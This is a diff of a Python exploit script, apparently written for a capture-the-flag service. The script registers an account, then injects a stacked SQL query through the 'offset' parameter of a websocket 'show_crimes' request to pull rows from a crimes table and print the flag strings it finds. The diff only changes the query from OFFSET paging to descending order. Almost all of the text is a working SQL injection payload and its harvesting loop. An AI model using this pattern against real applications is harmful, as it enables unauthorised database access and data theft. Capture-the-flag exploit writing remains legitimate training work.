@@ -66,29 +66,27 @@ class Client(object):
         self.register(username, password)
         self.auth(username, password)
         flags = set()
-        for offset in range(10):
-            self.ws.send(dumps(
-                {'action': 'show_crimes',
-                 'params': {'offset': "0; select crimeid, name, description, "
-                                      "city, country, crimedate, public "
-                                      "from crimes WHERE description "
-                                      "LIKE '%%%%=' "
-                                      "LIMIT 10 OFFSET %s --"
-                                      % (offset * 10) }}))
+        self.ws.send(dumps(
+            {'action': 'show_crimes',
+             'params': {'offset': "0; select crimeid, name, description, "
+                                  "city, country, crimedate, public "
+                                  "from crimes WHERE description "
+                                  "LIKE '%%%%=' ORDER BY "
+                                  "crimeid DESC LIMIT 10 --"}}))
+        answer = loads(self.ws.recv())
+        while 'text' in answer and 'New crime' in answer['text']:
             answer = loads(self.ws.recv())
-            while 'text' in answer and 'New crime' in answer['text']:
-                answer = loads(self.ws.recv())
     
-            if ("rows" in answer and
-                    "data" in answer['rows'][0]):
-                crimes = answer['rows'][0]['data']
-                for crime in crimes:
-                    flag = crime['article'].split()[-1]
-                    if flag[-1] == "=" and flag not in flags:
-                        print(flag)
-                        flags.add(flag)
-            else:
-                print(answer, file=stderr)
+        if ("rows" in answer and
+                "data" in answer['rows'][0]):
+            crimes = answer['rows'][0]['data']
+            for crime in crimes:
+                flag = crime['article'].split()[-1]
+                if flag[-1] == "=" and flag not in flags:
+                    print(flag)
+                    flags.add(flag)
+        else:
+            print(answer, file=stderr)
 
     def sploit_profile(self):
         username, password = '%x' % randrange(16**15), '%x' % randrange(16**15)
